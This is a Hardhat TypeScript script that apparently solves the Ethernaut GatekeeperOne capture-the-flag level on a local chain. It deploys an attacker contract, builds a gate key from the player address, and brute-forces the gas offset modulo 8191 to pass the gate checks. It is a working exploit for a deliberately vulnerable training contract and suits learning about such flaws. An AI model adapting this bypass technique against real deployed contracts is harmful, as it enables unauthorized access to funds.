import { ethers } from "hardhat";
import * as _fs from "fs";

async function main() {
  const accounts = await ethers.getSigners();
  const deployer = accounts[0];
  const player = accounts[1];

  console.log("Deploying Ethernaut contract ...");
  const ethernaut = await ethers.deployContract("Ethernaut");
  await ethernaut.waitForDeployment();
  console.log(
    `Ethernaut contract deployed to ${ethernaut.target} by deployer ${deployer.address}`
  );

  console.log("Deploying Level contract ...");
  const level = await ethers.deployContract("GatekeeperOne");
  await level.waitForDeployment();

  console.log(
    `Level contract deployed to ${level.target} by deployer ${deployer.address}`
  );
  await updateEnvFile(ethernaut.target as string, level.target as string);

  console.log("Deploying Attacker contract ...");

  const Attacker = await ethers.getContractFactory("GatekeeperOneAttacker");
  const attacker = await Attacker.deploy(level.target as string);

  // Attack
  // const gateKey = `0x1122334455667788`
  const address = await player.getAddress();
  const uint16TxOrigin = address.slice(-4);
  const gateKey = `0x100000000000${uint16TxOrigin}`;
  console.log(`gateKey = ${gateKey}`);
  // _gateKey = 0x1122334455667788
  // uint32(uint64(_gateKey)) 0x55667788 = 1432778632
  // uint64(_gateKey) 0x1122334455667788 = 1234605616436508552
  // uint16(tx.origin) 0xD74C = 55116
  // tx.orign = 0x48490375809Cf5Af9D635C7860BD7F83f9f2D74c

  // use this to bruteforce gas usage
  const MOD = 8191;
  const gasToUse = 800000;
  for (let i = 0; i < MOD; i++) {
    console.log(`testing ${gasToUse + i}`);
    try {
      const tx = await attacker.attack(gateKey, gasToUse + i, {
        gasLimit: `950000`,
      });
      console.log("passed with gas ->", 800000 + i);
      break;
    } catch {}
  }
  console.log(`gateKey = ${gateKey}`);
}

async function updateEnvFile(ethernaut_address: string, level_address: string) {
  console.log("Updating addresses to the .env files ... ");
  const dirpath = ".env";
  try {
    const fileData = await _fs.promises.readFile(dirpath);
    var fileAsStr = fileData.toString("utf8");
    var str = fileAsStr.split("ETHERNAUT_CONTRACT")[0];
    var address1 = `ETHERNAUT_CONTRACT = ${ethernaut_address}`;
    var address2 = `LEVEL_CONTRACT = ${level_address}`;
    var addrs = `${address1}\n${address2}`;

    await _fs.promises.writeFile(dirpath, str + addrs, "utf8");
  } catch (err) {
    console.log(err);
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
